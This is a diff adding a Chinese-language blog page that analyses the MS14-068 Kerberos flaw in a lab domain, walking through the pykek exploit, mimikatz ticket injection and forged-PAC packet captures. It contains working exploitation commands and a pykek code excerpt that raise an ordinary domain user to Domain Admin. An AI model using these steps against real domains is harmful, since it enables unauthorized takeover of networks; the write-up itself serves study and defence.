@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Kerberos," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介该漏洞能使普通域用户提权为域管理员权限 12345678910111213141516171819*环境：*域控：　　2008 R2 x64 　　OWA2010-GOD.god.org域内主机：　　win7 x64普通域账户：mary&#x2F;admin!@#45Python2 Pykek攻击程序Mimikatz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS14-068漏洞分析">
+<meta property="og:url" content="http://example.com/2021/03/21/MS14-068%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="简介该漏洞能使普通域用户提权为域管理员权限 12345678910111213141516171819*环境：*域控：　　2008 R2 x64 　　OWA2010-GOD.god.org域内主机：　　win7 x64普通域账户：mary&#x2F;admin!@#45Python2 Pykek攻击程序Mimikatz">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321220919.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221237.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221423.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221437.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221456.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222803.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223114.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223200.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223235.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223323.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223353.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223532.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223555.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224248.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224306.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224347.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224435.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224502.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224622.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224658.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224821.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224927.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224939.png">
+<meta property="article:published_time" content="2021-03-21T14:56:09.000Z">
+<meta property="article:modified_time" content="2021-03-21T15:15:23.744Z">
+<meta property="article:author" content="coco17ut">
+<meta property="article:tag" content="Kerberos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321220919.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/03/21/MS14-068漏洞分析/"/>
+
+
+
+
+
+  <title>MS14-068漏洞分析 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/21/MS14-068%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MS14-068漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-21T22:56:09+08:00">
+                2021-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>该漏洞能使普通域用户提权为域管理员权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*环境：*</span><br><span class="line"></span><br><span class="line">域控：</span><br><span class="line"></span><br><span class="line">　　2008 R2 x64 </span><br><span class="line"></span><br><span class="line">　　OWA2010-GOD.god.org</span><br><span class="line"></span><br><span class="line">域内主机：</span><br><span class="line"></span><br><span class="line">　　win7 x64</span><br><span class="line"></span><br><span class="line">普通域账户：mary&#x2F;admin!@#45</span><br><span class="line"></span><br><span class="line">Python2 </span><br><span class="line"></span><br><span class="line">Pykek攻击程序</span><br><span class="line"></span><br><span class="line">Mimikatz</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<!--more-->
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="获取域用户的SID、域控主机group"><a href="#获取域用户的SID、域控主机group" class="headerlink" title="获取域用户的SID、域控主机group"></a>获取域用户的SID、域控主机group</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use “domain controllers” /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321220919.png"></p>
+<h2 id="使用pykek的漏洞利用程序进行攻击"><a href="#使用pykek的漏洞利用程序进行攻击" class="headerlink" title="使用pykek的漏洞利用程序进行攻击"></a>使用pykek的漏洞利用程序进行攻击</h2><p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221237.png"></p>
+<p>　　进行攻击前需知道用户名、密码、SID、域控主机地址，在pykek-master的文件夹下生成了<a href="mailto:&#84;&#x47;&#84;&#x5f;&#109;&#97;&#x72;&#x79;&#x40;&#71;&#79;&#x44;&#46;&#x4f;&#x52;&#x47;&#46;&#x63;&#99;&#x61;&#99;&#104;&#101;">&#84;&#x47;&#84;&#x5f;&#109;&#97;&#x72;&#x79;&#x40;&#71;&#79;&#x44;&#46;&#x4f;&#x52;&#x47;&#46;&#x63;&#99;&#x61;&#99;&#104;&#101;</a>票据，需借助mimikatz将票据写入内存中，创建缓存证书。在此操作之前我们可以用klist命令看下缓存的证书有哪些。发现有五个缓存，如果此时不进行清除直接将TGT票据写入内存，在之后进行请求服务时，系统会从Credentials Cache中查看是否有对应的ServiceTicket（未清除时缓存的证书还是普通域用户的权限），如果没有找到则寻找TGT，找到后就发送给KDC申请ServiceTicket。</p>
+<h2 id="清除缓存证书，mimikatz写入"><a href="#清除缓存证书，mimikatz写入" class="headerlink" title="清除缓存证书，mimikatz写入"></a>清除缓存证书，mimikatz写入</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Klist</span><br><span class="line"></span><br><span class="line">mimikatz.exe kerberos::ptc C:\Users\mary.GOD\Desktop\pykek-master\TGT_mary@GOD.ORG.ccache</span><br><span class="line"></span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221423.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221437.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221456.png"></p>
+<h2 id="请求高权限服务"><a href="#请求高权限服务" class="headerlink" title="请求高权限服务"></a>请求高权限服务</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\OWA2010CN-GOD\C$</span><br><span class="line"><span class="built_in">dir</span> \\OWA2010CN-GOD\C$</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321221903.png"></p>
+<h1 id="漏洞细节分析"><a href="#漏洞细节分析" class="headerlink" title="漏洞细节分析"></a>漏洞细节分析</h1><h2 id="PAC的一些理解"><a href="#PAC的一些理解" class="headerlink" title="PAC的一些理解"></a>PAC的一些理解</h2><p>　　在kerberos协议里，client向server发起请求，serever解密ST证实了client身份，但不知道client有没有访问文件的权限。微软在kerberos协议里扩充了PAC（Privilege Attribute Certificate）。</p>
+<p>　　在AS_REQ请求时引入了include-pac项，include-pac为True时，AS_REP里ticket会携带PAC。PAC中包含了client的UserId、GroupIds、ExtraSids、ResourceGroupDomainSid等，PAC包含了两个数字签名，一个是Server Signature另一个是KDC Signature。微软给出的文档 “For the server’s checksum, the key used to generate the signature should be the same key used to encrypt the ticket.” <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#signatures-pac_server_checksum-and-pac_privsvr_checksum">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#signatures-pac_server_checksum-and-pac_privsvr_checksum</a></p>
+<p>　　对client和AS服务来说server指的是TGS服务，AS和TGS的密码就是krbtgt用户的NTLM hash。两个数字签名和TGT加密时用的key相同但加密算法不同。</p>
+<p>　　Client解密得到加密的TGT，在TGS_REQ中携带TGT发送给TGS，在认证了client的信息后，将解密PAC并验证两个签名，如果签名合法则认为PAC没有被篡改。此时将更换PAC的两个签名，根据前面已经知道key与ticket相同，所以此时两个数字签名的key为server的NTLM hash。</p>
+<p>　　在AP_REQ阶段携带ST请求server，server解密得到PAC并向KDC确认client用户权限，KDC将结果返回至server。</p>
+<h2 id="漏洞利用的流程"><a href="#漏洞利用的流程" class="headerlink" title="漏洞利用的流程"></a>漏洞利用的流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">build AS-REQ -&gt; send AS-REQ</span><br><span class="line">recv AS_REP -&gt; get session_key1 TGT_a</span><br><span class="line">build PAC -&gt; build TGS_REQ -&gt; send TGS_REQ</span><br><span class="line">recv AS_REP -&gt; get session_key2 TGT_b</span><br></pre></td></tr></table></figure>
+<p>附上部分相关代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># build AS-REQ</span></span><br><span class="line">    sock = send_req(as_req, kdc_a)</span><br><span class="line">    <span class="comment"># send AS-REQ</span></span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)</span><br><span class="line">    <span class="comment"># decrypt AS-REP</span></span><br><span class="line">    session_key = (<span class="built_in">int</span>(as_rep_enc[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;keytype&#x27;</span>]), <span class="built_in">str</span>(as_rep_enc[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;keyvalue&#x27;</span>]))</span><br><span class="line">    <span class="comment"># get session_key1</span></span><br><span class="line">    logon_time = gt2epoch(<span class="built_in">str</span>(as_rep_enc[<span class="string">&#x27;authtime&#x27;</span>]))</span><br><span class="line">    tgt_a = as_rep[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">    <span class="comment"># get tgt_a</span></span><br><span class="line">    </span><br><span class="line">    subkey = generate_subkey()</span><br><span class="line">    nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">    current_time = time()</span><br><span class="line">    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))</span><br><span class="line">    <span class="comment"># build PAC</span></span><br><span class="line">    tgs_req = build_tgs_req(user_realm, <span class="string">&#x27;krbtgt&#x27;</span>, target_realm, user_realm, user_name,</span><br><span class="line">                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># build TGS_REQ</span></span><br><span class="line">    sock = send_req(tgs_req, kdc_a)</span><br><span class="line">    <span class="comment"># send TGS_REQ</span></span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)</span><br><span class="line">    <span class="comment">#decrypt TGS_REP</span></span><br><span class="line">    session_key2 = (<span class="built_in">int</span>(tgs_rep_enc[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;keytype&#x27;</span>]), <span class="built_in">str</span>(tgs_rep_enc[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;keyvalue&#x27;</span>]))</span><br><span class="line">    <span class="comment">#get session_key2</span></span><br><span class="line">    tgt_b = tgs_rep[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">    <span class="comment">#get TGT_b</span></span><br><span class="line">sys.stderr.write(<span class="string">&#x27; Done!\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>　　上面流程中比较奇怪的一点是，在recv AS_REP后解密却得到了TGT_b，正常的流程不应该是得到Service Ticket吗？这也是漏洞成因，下面结合数据包分析流程。</p>
+<h2 id="构造AS-REQ"><a href="#构造AS-REQ" class="headerlink" title="构造AS_REQ"></a>构造AS_REQ</h2><p>　　看一下代码的结构，其中include-pac被设置成了False，对比一下抓取的数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222735.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222803.png"></p>
+<p>　　左侧为构造的数据，右侧为正常的数据包，能够清楚的看到include-pac设置为False，kdc-options由常见的0x40810010设置为0x50800000，加密方式为eTYPE-ARCFOUR-HMAC-MD5 (23)，正常的数据包采用 eTYPE-AES256-CTS-HMAC-SHA1-96 (18)加密方式这一点我们也能从代码结构中看到：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321222817.png"></p>
+<p>　　之所以将include-pac设置为False，是因为AS收到AS_REQ时，对include-pac值进行判断，在AS通过认证后返回的数据包中不包含PAC的信息。若include-pac值为True，将在AS_REP中的TGT加入PAC信息。</p>
+<h2 id="接收AS-REP"><a href="#接收AS-REP" class="headerlink" title="接收AS_REP"></a>接收AS_REP</h2><p>　　可以看到用user_key解密得到16位的session_key(用于后续通讯)，和使用krbtgt的ntlm hash加密的TGT_a(不含PAC信息)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223114.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223200.png"></p>
+<p>通过对比两个数据包，发现左侧返回的内容缺少了padata部分，使用的加密方式依旧是etype: eTYPE-ARCFOUR-HMAC-MD5 (23)</p>
+<h2 id="构造PAC"><a href="#构造PAC" class="headerlink" title="构造PAC"></a>构造PAC</h2><p>下面是PAC的结构图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223235.png"></p>
+<p>　　在PACTYPE structure里有一个重要的KERB_VALIDATION_INFO structure，它定义了用户登录、授权的一些信息。其中有UserId、PrimaryGroupId（用户所在的组）。接下来我们看一下pykek是怎么构造的PAC</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223323.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223353.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#	域用户（513）</span><br><span class="line">#	域管理员（512）</span><br><span class="line">#	组策略创建者所有者（520）</span><br><span class="line">#	架构管理员（518）</span><br><span class="line">#	企业管理员（519）</span><br></pre></td></tr></table></figure>
+<p>　　从上面我们可以看到把域用户加入到了域管理员等5个组，从而具有了域管的权限。但是我们在前面提到过，PAC最后需要有使用server_key和KDC_key的加密的两个签名。但这里并不知道krbtgt用户的NTLM hash，那是怎么制作的PAC呢？</p>
+<p>　　漏洞一：KDC无法正确检查票据中所携带的特权属性证书（PAC）的有效签名。</p>
+<p>　　这也就意味着我们可以伪造PAC，不使用原本要用到的HMCA系列的checksum算法，原来的算法需要key参与才能生成签名。如果使用MD5算法便不需要key参与，这样便可随意修改PAC的内容，最后使用MD5生成服务检验和以及KDC校验和。现在PAC做好了，但是PAC是附在TGT里面，TGT是使用krbtgt用户的NTLM hash进行加密的，这里并不知道密钥，那是怎么把PAC传输给KDC呢</p>
+<p>　　漏洞二：KDC能够解析放在其它位置上PAC内容</p>
+<h2 id="构造TGS-REQ"><a href="#构造TGS-REQ" class="headerlink" title="构造TGS_REQ"></a>构造TGS_REQ</h2><p>　　从下面的图片可以看出作者将PAC放入了req_body下面的enc-authorization-data里面，其中ad-type是加密算法，ad-data是PAC加密的内容。加密的subkey是随机生成的，KDC也不知道，所以作者将subkey与TGT一块放入了ap-req里。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223532.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321223555.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224248.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224306.png"></p>
+<h2 id="接收TGS-REP"><a href="#接收TGS-REP" class="headerlink" title="接收TGS-REP"></a>接收TGS-REP</h2><p>　　通过下面图片我们可以看到使用subkey进行解密，解密后竟然得到了一个session_key和TGT，按照之前的kerberos协议应该返回一个使用请求服务的NTLM HASH进行加密的ST（server ticket）。</p>
+<p>　　漏洞三：按照之前的设置在TGS_REQ请求后，KDC会从authorization中解密出subkey，对PAC进行签名验证。同时还会对TGT进行解密得到SessionKeya-kdc。在验证成功后还会对解密的PAC使用server_key和kdc_key进行签名，重新组合成一个TGT，并把SessionKeya-kdc使用subkey加密发送给client。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224347.png"></p>
+<h2 id="换取ST"><a href="#换取ST" class="headerlink" title="换取ST"></a>换取ST</h2><p>　　此时我们已经有了TGT，并将票据凭证写入了内存。但是还没有ST，需要利用缓存的TGT再次发送TGS_REQ。下面是使用net use \OWA2010CN-GOD\C$的抓包。比较奇怪的是TGS_REQ和TGS_REP进行了三个来回。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224435.png"></p>
+<p>　　接下来查看73和74组数据包里内容，发现请求了cifs服务的ST。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224502.png"></p>
+<p>　　接下来查看81、82两个数据包发现依旧是携带TGT请求krbtgt服务的ST，但是authenticator的加密类型是eTYPE-ARCFOUR-HMAC-MD5 (23)，但下面的支持类型只有一种ENCTYPE: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)，所以在TGS_REP中返回了error-code: eRR-ETYPE-NOSUPP (14)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224622.png"></p>
+<p>　　接下来查看89和90两个数据包，在etype添加了可支持的加密类型，返回了ST，票据的加密类型为etype: eTYPE-ARCFOUR-HMAC-MD5 (23)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224658.png"></p>
+<p>　　此时我们再用klist命令查看本地的缓存证书发现多出来了两个，正是刚才申请的ST证书。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224821.png"></p>
+<p>　　之后经过TCP握手后再基于SMB协议携带ST请求服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224927.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/coco17ut/upload/data/20210321224939.png"></p>
+<p>　　至此整个漏洞利用流程已经完成，可能在一些细节理解有误，恳请指正。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/56081.html">https://www.freebuf.com/vuls/56081.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/21181737-74fd-492c-bfbd-0322993a9061">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/21181737-74fd-492c-bfbd-0322993a9061</a></p>
+<p><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/">https://daiker.gitbook.io/windows-protocol/</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@robert.broeckelmann/kerberos-and-windows-security-kerberos-on-windows-3bc021bc9630">https://medium.com/@robert.broeckelmann/kerberos-and-windows-security-kerberos-on-windows-3bc021bc9630</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Kerberos/" rel="tag"># Kerberos</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/21/kerberos%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3/" rel="next" title="Kerberos协议理解">
+                <i class="fa fa-chevron-left"></i> Kerberos协议理解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20">
+               <!-- <a href="/archives/%20%7C%7C%20archive"> -->
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
